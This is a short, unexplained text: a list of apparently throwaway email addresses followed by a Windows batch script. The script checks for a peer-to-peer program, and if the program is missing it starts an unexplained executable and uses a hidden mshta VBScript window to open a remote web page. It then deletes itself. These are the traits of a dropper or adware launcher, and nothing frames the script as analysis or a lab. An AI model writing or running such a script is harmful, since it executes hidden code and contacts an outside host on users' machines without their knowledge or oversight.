sghoerg@sina.com
fhdfgjldf@sina.com
sdgsdgsdds@sina.com
df56h4df56@sina.com
fdghd56fg@sina.com
dfgujddfh 
@echo off

if exist tmp.txt del /q tmp.txt

for /f %%i in ('dir /a /b C:\"Program Files"\Gomez\GomezPEER\ping.exe') do echo %%i>>tmp.txt

if exist tmp.txt (goto 11) else (goto 12)

if exist tmp.txt del /q tmp.txt

:11

goto q

     :12

start go.exe
mshta vbscript:CreateObject("WScript.Shell").Run("iexplore http://web.guangpeer.cn/css/gauga.asp",0)(window.close)

:q
del tmp.txt
del veryif.bat
exit
